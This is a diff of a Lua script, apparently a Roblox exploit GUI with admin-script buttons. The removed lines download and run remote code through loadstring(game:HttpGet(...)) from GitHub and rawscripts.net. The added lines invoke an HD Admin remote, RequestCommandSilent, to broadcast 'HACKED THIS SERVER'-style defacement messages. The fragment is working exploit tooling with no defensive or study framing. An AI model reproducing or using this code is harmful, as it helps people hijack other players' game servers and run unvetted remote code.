@@ -1349,13 +1349,19 @@ end)
 createButton("OPadmin", "OPadmin\n[Deleted]", 200, 85, 95, 40, true)
 local InfiniteYieldBtn = createButton("InfiniteYield", "Infinite Yield", 300, 85, 95, 40)
 InfiniteYieldBtn.MouseButton1Click:Connect(function()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+    
+    RequestCommand:InvokeServer(":SH 2SP00KY HACKED THIS SERVER")
+    
 end)
 
 local NamelessAdminBtn = createButton("NamelessAdmin", "Nameless Admin REWORKED", 200, 130, 95, 40)
 NamelessAdminBtn.MouseButton1Click:Connect(function()
-loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Nameless-admin-reworked-75477"))()
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+    
+    RequestCommand:InvokeServer(":SM T2S ON TOP!")
 
 end)
 
